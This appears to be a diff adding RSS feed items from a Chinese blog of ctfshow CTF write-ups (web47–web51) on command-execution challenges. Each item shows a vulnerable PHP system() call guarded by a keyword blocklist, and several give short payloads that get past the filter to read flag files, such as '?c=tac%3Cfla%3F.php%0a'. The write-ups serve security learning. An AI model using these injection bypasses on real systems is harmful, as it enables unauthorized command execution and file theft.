+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web47/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web47/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250308170327125&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308170327125.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:59:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;p&gt;preg_match过滤字段&lt;code&gt;; cat flag [0-9] $ * more less head sort tail&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;标准输出重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;可套用&lt;a href=&#34;D:%5Cmarkdown_note%5CCTFshow%5Cweb%5C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%5CWeb46.md&#34;&gt;Web46&lt;/a&gt;payload，此处不再赘述&lt;/p&gt;
+&lt;p&gt;解法四-&amp;gt;&lt;code&gt;nl&amp;lt;fla&#39;&#39;g.php||&lt;/code&gt; nl查看源代码，&amp;lt;代替空格，’&amp;lsquo;分割flag过滤，||解决命令黑洞&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web48</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web48/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web48/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250308205423506&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308205423506.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:06:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;payload同&lt;a href=&#34;D:%5Cmarkdown_note%5CCTFshow%5Cweb%5C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%5CWeb46.md&#34;&gt;Web46&lt;/a&gt;，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web49</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web49/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web49/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250308210512826&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308210512826.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:22:43
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;过滤字段新增&lt;code&gt;%&lt;/code&gt;，由于此前的payload中包含的%在url编码时会被自动解析，故无影响，payload同上不再赘述。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web50</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web50/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web50/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250308210932357&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308210932357.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!ImPORTANT]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:32:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOte]&lt;/p&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;p&gt;过滤字段新增&lt;code&gt;x09&lt;/code&gt;,&lt;code&gt;x26&lt;/code&gt;即&lt;code&gt;Tab&lt;/code&gt;,&lt;code&gt;&amp;amp;&lt;/code&gt;的16进制形式&lt;/p&gt;
+&lt;p&gt;标准输出重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;故构造payload时候需要采用&lt;code&gt;&amp;lt;&lt;/code&gt;替换空格，&lt;code&gt;%0a&lt;/code&gt;换行替代封号&lt;/p&gt;
+&lt;p&gt;构造payload如下&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?c=tac%3Cfla%3F.php%0a
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;目录搜寻过程不再赘述&lt;/p&gt;
+&lt;p&gt;提交payload获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250308212637707&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250308212637707.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web51</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web51/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web51/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250309141651447&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250309141651447.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Important]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，获得源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:42:52
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!Note]&lt;/p&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;p&gt;preg_match过滤字段新增tac&lt;/p&gt;
+&lt;p&gt;标准输出重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;构造payload思路为使用&lt;a href=&#34;......%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2.md&#34;&gt;&lt;code&gt;nl&lt;/code&gt;替换tac&lt;/a&gt;并截断重定向&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;目录扫描过程不再赘述，提交payload查看源码获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250311162032539&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311162032539.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
